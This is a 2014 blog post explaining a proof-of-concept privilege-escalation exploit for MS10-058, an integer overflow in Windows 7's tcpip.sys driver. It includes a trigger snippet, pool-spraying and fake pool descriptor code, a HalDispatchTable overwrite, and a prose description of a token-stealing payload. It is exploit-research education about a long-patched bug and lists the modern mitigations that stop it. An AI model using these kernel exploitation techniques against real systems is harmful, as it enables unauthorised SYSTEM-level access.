---
layout: post
title: "First dip into the kernel pool : MS10-058"
date: 2014-03-11 10:52:37 +0100
author: Jeremy "__x86" Fetiveau
comments: true
categories: [reverse-engineering, exploitation, kernel pool, ms10-058, tcpip.sys]
toc: true
---

# Introduction

I am currently playing with pool-based memory corruption vulnerabilities. That’s why I wanted to program a PoC exploit for the vulnerability presented by Tarjei Mandt during his first talk “Kernel Pool Exploitation on Windows 7” [[3]](http://www.mista.nu/research/MANDT-kernelpool-PAPER.pdf). I think it's a good exercise to start learning about pool overflows.

#Forewords

If you want to experiment with this vulnerability, you should read [[1]](http://www.itsecdb.com/oval/definition/oval/gov.nist.USGCB.patch/def/11689/MS10-058-Vulnerabilities-in-TCP-IP-Could-Allow-Elevation-of.html) and be sure to have a vulnerable system. I tested my exploit on a VM with Windows 7 32 bits with tcpip.sys 6.1.7600.16385. The Microsoft bulletin dealing with this vulnerability is MS10-058. It has been found by Matthieu Suiche [[2]](http://technet.microsoft.com/fr-fr/security/bulletin/ms10-058) and was used as an example on Tarjei Mandt’s paper [[3]](http://www.mista.nu/research/MANDT-kernelpool-PAPER.pdf).

#Triggering the flaw

An integer overflow in *tcpip!IppSortDestinationAddresses* allows to allocate a wrong-sized non-paged pool memory chunk. Below you can see the diff between the vulnerable version and the patched version.

{%img center /images/MS10-058/diff.png %}

<div class='entry-content-toc'></div>

<!--more-->

So basically the flaw is merely an integer overflow that triggers a pool overflow. 

```text
IppSortDestinationAddresses(x,x,x)+29   imul    eax, 1Ch
IppSortDestinationAddresses(x,x,x)+2C   push    esi
IppSortDestinationAddresses(x,x,x)+2D   mov     esi, ds:__imp__ExAllocatePoolWithTag@12 
IppSortDestinationAddresses(x,x,x)+33   push    edi
IppSortDestinationAddresses(x,x,x)+34   mov     edi, 73617049h
IppSortDestinationAddresses(x,x,x)+39   push    edi   
IppSortDestinationAddresses(x,x,x)+3A   push    eax  
IppSortDestinationAddresses(x,x,x)+3B   push    ebx           
IppSortDestinationAddresses(x,x,x)+3C   call    esi ; ExAllocatePoolWithTag(x,x,x) 
```

You can reach this code using a *WSAIoctl* with the code *SIO_ADDRESS_LIST_SORT* using a call like this :

```text
WSAIoctl(sock, SIO_ADDRESS_LIST_SORT, pwn, 0x1000, pwn, 0x1000, &cb, NULL, NULL)
```
You have to pass the function a pointer to a *SOCKET_ADDRESS_LIST* (*pwn* in the example). This *SOCKET_ADDRESS_LIST* contains an *iAddressCount* field and *iAddressCount* *SOCKET_ADDRESS* structures. With a high *iAddressCount* value, the integer will wrap, thus triggering the wrong-sized allocation.  We can almost write anything in those structures. There are only two limitations : 

```text
IppFlattenAddressList(x,x)+25   lea     ecx, [ecx+ebx*8]
IppFlattenAddressList(x,x)+28   cmp     dword ptr [ecx+8], 1Ch
IppFlattenAddressList(x,x)+2C   jz      short loc_4DCA9 

IppFlattenAddressList(x,x)+9C   cmp     word ptr [edx], 17h
IppFlattenAddressList(x,x)+A0   jnz     short loc_4DCA2
```

The copy will stop if those checks fail. That means that each *SOCKET_ADDRESS* has a length of 0x1c and that each *SOCKADDR* buffer pointed to by the socket address begins with a 0x17 byte. Long story short :

  * Make the multiplication at *IppSortDestinationAddresses+29* overflow
  * Get a non-paged pool chunk at *IppSortDestinationAddresses+3e* that is too little
  * Write user controlled memory to this chunk in *IppFlattenAddressList+67* and overflow as much as you want (provided that you take care of the 0x1c and 0x17 bytes)

The code below should trigger a BSOD. Now the objective is to place an object after our vulnerable object and modify pool metadata. 
```text
WSADATA wd = {0};
SOCKET sock = 0;
SOCKET_ADDRESS_LIST *pwn = (SOCKET_ADDRESS_LIST*)malloc(sizeof(INT) + 4 * sizeof(SOCKET_ADDRESS));
DWORD cb;

memset(buffer,0x41,0x1c);
buffer[0] = 0x17;
buffer[1] = 0x00;
sa.lpSockaddr = (LPSOCKADDR)buffer;
sa.iSockaddrLength = 0x1c;
pwn->iAddressCount = 0x40000003;
memcpy(&pwn->Address[0],&sa,sizeof(_SOCKET_ADDRESS));
memcpy(&pwn->Address[1],&sa,sizeof(_SOCKET_ADDRESS));
memcpy(&pwn->Address[2],&sa,sizeof(_SOCKET_ADDRESS));
memcpy(&pwn->Address[3],&sa,sizeof(_SOCKET_ADDRESS));

WSAStartup(MAKEWORD(2,0), &wd)
sock = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);
WSAIoctl(sock, SIO_ADDRESS_LIST_SORT, pwn, 0x1000, pwn, 0x1000, &cb, NULL, NULL)
```

#Spraying the pool 
##Non paged objects

There are several objects that we could easily use to manipulate the non-paged pool. For instance we could use semaphore objects or reserve objects.
```text
*8516b848 size:   48 previous size:   48  (Allocated) Sema 
*85242d08 size:   68 previous size:   68  (Allocated) User 
*850fcea8 size:   60 previous size:    8  (Allocated) IoCo 
```

We are trying to overflow a pool chunk with a size being a multiple of 0x1c. As 0x1c\*3=0x54, the driver is going to request 0x54 bytes and being therefore given a chunk of 0x60 bytes. This is exactly the size of an I/O completion reserve object. To allocate a IoCo, we just need to call *NtAllocateReserveObject* with the object type IOCO. To deallocate the IoCo, we could simply close the associate the handle. Doing this would make the object manager release the object. For more in-depth information about reserve objects, you can read j00ru’s article [[4]](http://magazine.hitb.org/issues/HITB-Ezine-Issue-003.pdf).

In order to spray, we are first going to allocate a lot of IoCo without releasing them so as to fill existing holes in the pool. After that, we want to allocate IoCo and make holes of 0x60 bytes. This is illustrated in the *sprayIoCo()* function of my PoC. Now we are able have an IoCo pool chunk following an Ipas pool chunk (as you might have noticed, ‘Ipas’ is the tag used by the tcpip driver). Therefore, we can easily corrupt its pool header.

##nt!PoolHitTag

If you want to debug a specific call to *ExFreePoolWithTag* and simply break on it you’ll see that there are way too much frees (and above all, this is very slow when kernel debugging). A simple approach to circumvent this issue is to use pool hit tags. 

```text
ExFreePoolWithTag(x,x)+62F                  and     ecx, 7FFFFFFFh
ExFreePoolWithTag(x,x)+635                  mov     eax, ebx
ExFreePoolWithTag(x,x)+637                  mov     ebx, ecx
ExFreePoolWithTag(x,x)+639                  shl     eax, 3
ExFreePoolWithTag(x,x)+63C                  mov     [esp+58h+var_28], eax
ExFreePoolWithTag(x,x)+640                  mov     [esp+58h+var_2C], ebx
ExFreePoolWithTag(x,x)+644                  cmp     ebx, _PoolHitTag
ExFreePoolWithTag(x,x)+64A                  jnz     short loc_5180E9
ExFreePoolWithTag(x,x)+64C                  int     3               ; Trap to Debugger
```

As you can see on the listing above, *nt!PoolHitTag* is compared against the pool tag of the currently freed chunk. Notice the mask : it allows you to use the raw tag. (for instance ‘oooo’ instead of 0xef6f6f6f) By the way, you are not required to use the genuine tag. (eg : you can use ‘ooo’ for ‘IoCo’) Now you know that you can *ed nt!PoolHitTag ‘oooo’* to debug your exploit.

#Exploitation technique 
##Basic structure 

As the internals of the pool are thoroughly detailed in Tarjei Mandt’s paper [[3]](http://www.mista.nu/research/MANDT-kernelpool-PAPER.pdf), I will only be giving a glimpse at the pool descriptor and the pool header structures. The pool memory is divided into several types of pool. Two of them are the paged pool and the non-paged pool. A pool is described by a *_POOL_DESCRIPTOR* structure as seen below.
```text
0: kd> dt _POOL_TYPE
ntdll!_POOL_TYPE
   NonPagedPool = 0n0
   PagedPool = 0n1
```
```text
0: kd> dt _POOL_DESCRIPTOR
nt!_POOL_DESCRIPTOR
   +0x000 PoolType         : _POOL_TYPE
   +0x004 PagedLock        : _KGUARDED_MUTEX
   +0x004 NonPagedLock     : Uint4B
   +0x040 RunningAllocs    : Int4B
   +0x044 RunningDeAllocs  : Int4B
   +0x048 TotalBigPages    : Int4B
   +0x04c ThreadsProcessingDeferrals : Int4B
   +0x050 TotalBytes       : Uint4B
   +0x080 PoolIndex        : Uint4B
   +0x0c0 TotalPages       : Int4B
   +0x100 PendingFrees     : Ptr32 Ptr32 Void
   +0x104 PendingFreeDepth : Int4B
   +0x140 ListHeads        : [512] _LIST_ENTRY
```
A pool descriptor references free memory in a free list called *ListHeads*. The *PendingFrees* field references chunks of memory waiting to be freed to the free list. Pointers to pool descriptor structures are stored in arrays such as *PoolVector* (non-paged) or *ExpPagedPoolDescriptor* (paged). Each chunk of memory contains a header before the actual data. This is the *_POOL_HEADER*. It brings information such as the size of the block or the pool it belongs to.

```text
0: kd> dt _POOL_HEADER
nt!_POOL_HEADER
   +0x000 PreviousSize     : Pos 0, 9 Bits
   +0x000 PoolIndex        : Pos 9, 7 Bits
   +0x002 BlockSize        : Pos 0, 9 Bits
   +0x002 PoolType         : Pos 9, 7 Bits
   +0x000 Ulong1           : Uint4B
   +0x004 PoolTag          : Uint4B
   +0x004 AllocatorBackTraceIndex : Uint2B
   +0x006 PoolTagHash      : Uint2B
```

##PoolIndex overwrite

The basic idea of this attack is to corrupt the *PoolIndex* field of a pool header. This field is used when deallocating paged pool chunks in order to know which pool descriptor it belongs to. It is used as an index in an array of pointers to pool descriptors. Thus, if an attacker is able to corrupt it, he can make the pool manager believe that a specific chunk belongs to another pool descriptor. For instance, one could reference a pool descriptor out of the bounds of the array. 

```text
0: kd> dd ExpPagedPoolDescriptor
82947ae0  84835000 84836140 84837280 848383c0
82947af0  84839500 00000000 00000000 00000000
```

As there are always some null pointers after the array, it could be used to craft a fake pool descriptor in a user-allocated null page. 

##Non paged pool type

To determine the *_POOL_DESCRIPTOR* to use, *ExFreePoolWithTag* gets the appropriate *_POOL_HEADER* and stores *PoolType* (*watchMe*) and *BlockSize* (*var_3c*)

```text
ExFreePoolWithTag(x,x)+465
ExFreePoolWithTag(x,x)+465  loc_517F01:
ExFreePoolWithTag(x,x)+465  mov     edi, esi
ExFreePoolWithTag(x,x)+467  movzx   ecx, word ptr [edi-6]
ExFreePoolWithTag(x,x)+46B  add     edi, 0FFFFFFF8h
ExFreePoolWithTag(x,x)+46E  movzx   eax, cx
ExFreePoolWithTag(x,x)+471  mov     ebx, eax
ExFreePoolWithTag(x,x)+473  shr     eax, 9
ExFreePoolWithTag(x,x)+476  mov     esi, 1FFh
ExFreePoolWithTag(x,x)+47B  and     ebx, esi
ExFreePoolWithTag(x,x)+47D  mov     [esp+58h+var_40], eax
ExFreePoolWithTag(x,x)+481  and     eax, 1
ExFreePoolWithTag(x,x)+484  mov     edx, 400h
ExFreePoolWithTag(x,x)+489  mov     [esp+58h+var_3C], ebx
ExFreePoolWithTag(x,x)+48D  mov     [esp+58h+watchMe], eax
ExFreePoolWithTag(x,x)+491  test    edx, ecx
ExFreePoolWithTag(x,x)+493  jnz     short loc_517F49
```

Later, if *ExpNumberOfNonPagedPools* equals 1, the correct pool descriptor will directly be taken from *nt!PoolVector[0]*. The PoolIndex is not used. 

```text
ExFreePoolWithTag(x,x)+5C8  loc_518064:
ExFreePoolWithTag(x,x)+5C8  mov     eax, [esp+58h+watchMe]
ExFreePoolWithTag(x,x)+5CC  mov     edx, _PoolVector[eax*4]
ExFreePoolWithTag(x,x)+5D3  mov     [esp+58h+var_48], edx
ExFreePoolWithTag(x,x)+5D7  mov     edx, [esp+58h+var_40]
ExFreePoolWithTag(x,x)+5DB  and     edx, 20h
ExFreePoolWithTag(x,x)+5DE  mov     [esp+58h+var_20], edx
ExFreePoolWithTag(x,x)+5E2  jz      short loc_5180B6


ExFreePoolWithTag(x,x)+5E8  loc_518084:
ExFreePoolWithTag(x,x)+5E8  cmp     _ExpNumberOfNonPagedPools, 1
ExFreePoolWithTag(x,x)+5EF  jbe     short loc_5180CB

ExFreePoolWithTag(x,x)+5F1  movzx   eax, word ptr [edi]
ExFreePoolWithTag(x,x)+5F4  shr     eax, 9
ExFreePoolWithTag(x,x)+5F7  mov     eax, _ExpNonPagedPoolDescriptor[eax*4]
ExFreePoolWithTag(x,x)+5FE  jmp     short loc_5180C7
```

Therefore, you have to make the pool manager believe that the chunk is located in paged memory. 

##Crafting a fake pool descriptor 

As we want a fake pool descriptor at null address. We just allocate this page and put a fake deferred free list and a fake ListHeads.

When freeing a chunk, if the deferred freelist contains at least 0x20 entries, *ExFreePoolWithTag* is going to actually free those chunks and put them on the appropriate entries of the *ListHeads*. 

```text

*(PCHAR*)0x100 = (PCHAR)0x1208; 
*(PCHAR*)0x104 = (PCHAR)0x20;
for (i = 0x140; i < 0x1140; i += 8) {
    *(PCHAR*)i = (PCHAR)WriteAddress-4;
}
*(PINT)0x1200 = (INT)0x060c0a00;
*(PINT)0x1204 = (INT)0x6f6f6f6f;
*(PCHAR*)0x1208 = (PCHAR)0x0;
*(PINT)0x1260 = (INT)0x060c0a0c;
*(PINT)0x1264 = (INT)0x6f6f6f6f;
```

##Notes

It is interesting to note that this attack would not work with modern mitigations. Here are a few reasons : 

  * Validation of the *PoolIndex* field
  * Prevention of the null page allocation
  * *NonPagedPoolNX* has been introduced with Windows 8 and should be used instead of the *NonPagedPool* type. 
  * SMAP would prevent access to userland data
  * SMEP would prevent execution of userland code 

#Payload and clean-up 

A classical target for write-what-where scenarios is the *HalDispatchTable*. We just have to overwrite *HalDispatchTable+4* with a pointer to our payload which is *setupPayload()*. When we are done, we just have to put back the pointer to *hal!HaliQuerySystemInformation*. (otherwise you can expect some crashes)

Now that we are able to execute arbitrary code from kernel land we just have to get the *_EPROCESS* of the attacking process with *PsGetCurrentProcess()* and walk the list of processes using the *ActiveProcessLinks* field until we encounter a process with *ImageFileName* equal to “System”. Then we just replace the access token of the attacker process by the one of the system process. Note that the lazy author of this exploit hardcoded several offsets :).

This is illustrated in *payload()*. 

{%img center /images/MS10-058/screenshot.png %}

#Greetings

Special thanks to my friend [@0vercl0k](https://twitter.com/0vercl0k) for his review and help!

#Conclusion

I hope you enjoyed this article. If you want to know more about the topic, check out the latest papers of Tarjei Mandt, Zhenhua Liu and Nikita Tarakanov. (or wait for other articles ;) )

You can find my code on my new github [[5]](https://github.com/JeremyFetiveau/Exploits/blob/master/MS10-058.cpp). Don’t hesitate to share comments on my article or my exploit if you see something wrong :)

#References

[1] [Vulnerability details on itsecdb](http://www.itsecdb.com/oval/definition/oval/gov.nist.USGCB.patch/def/11689/MS10-058-Vulnerabilities-in-TCP-IP-Could-Allow-Elevation-of.html)

[2] [MS bulletin](http://technet.microsoft.com/fr-fr/security/bulletin/ms10-058)

[3] [Kernel Pool Exploitation on Windows 7](http://www.mista.nu/research/MANDT-kernelpool-PAPER.pdf) - Tarjei Mandt's paper. A must-read!

[4] [Reserve Objects in Windows 7](http://magazine.hitb.org/issues/HITB-Ezine-Issue-003.pdf) - Great j00ru's article!

[5] [The code of my exploit for MS10-058](https://github.com/JeremyFetiveau/Exploits/blob/master/MS10-058.cpp)

